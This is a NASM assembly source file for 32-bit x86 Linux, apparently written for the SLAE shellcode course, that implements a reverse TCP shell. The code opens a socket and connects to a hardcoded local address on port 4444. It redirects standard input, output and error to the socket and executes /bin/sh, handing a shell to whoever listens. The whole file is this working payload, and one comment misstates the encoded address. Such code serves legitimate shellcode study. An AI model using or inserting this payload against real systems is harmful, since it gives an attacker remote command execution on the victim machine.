; Filename: ReverseShellTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on reverse connect

global _start			

section .text

_start:

    ; Socket
    ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    mov eax, 102
    mov ebx, 1
    push 0 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; connect(s, (struct sockaddr *)&sa, sizeof(sa));
    ; EAX = socket_call = 102
    ; EBX = SYS_CONNECT = 3
    ; ECX = pointer to ESP (16, ptr (struct sockaddr))
    mov eax, 102
    mov ebx, 3

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; sa.sin_family = AF_INET;
    ; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    ; sa.sin_port = htons(REMOTE_PORT);

    ; Reverse pushing
    push 0x0101017f ; inet_addr("127.0.0.1")
    push WORD 0x5C11 ; htons(4444) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sa)
    push ecx ; (struct sockaddr *)&sa
    push edi ; s

    mov ecx, esp ; ptr to data structure

    int 0x80

    ; Dup2
    ; dup2(s,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Input = 0
    mov eax, 63 
    mov ebx, edi
    mov ecx, 0

    int 0x80

    ; dup2(s,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Output = 1
    mov eax, 63
    mov ecx, 1

    int 0x80

    ; dup2(s,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = EDI = s
    ; ECX = Standard Error = 2
    mov eax, 63
    mov ecx, 2

    int 0x80

    ; execve("/bin/sh", 0, 0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    mov eax, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    push 0 ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    mov ecx, 0
    mov edx, 0

    int 0x80